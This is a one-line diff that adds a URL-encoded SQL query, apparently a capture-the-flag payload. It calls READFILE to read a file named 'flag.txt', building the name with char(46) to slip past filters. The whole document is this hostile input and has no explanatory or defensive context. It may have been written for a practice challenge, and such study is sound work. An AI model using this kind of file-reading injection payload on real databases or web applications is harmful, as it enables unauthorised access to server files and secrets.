@@ -1,0 +1,1 @@
+select%20b%20from%20(select%20READFILE(%27flag%27||char(46)||%27txt%27)%20as%20b)%20as%20c
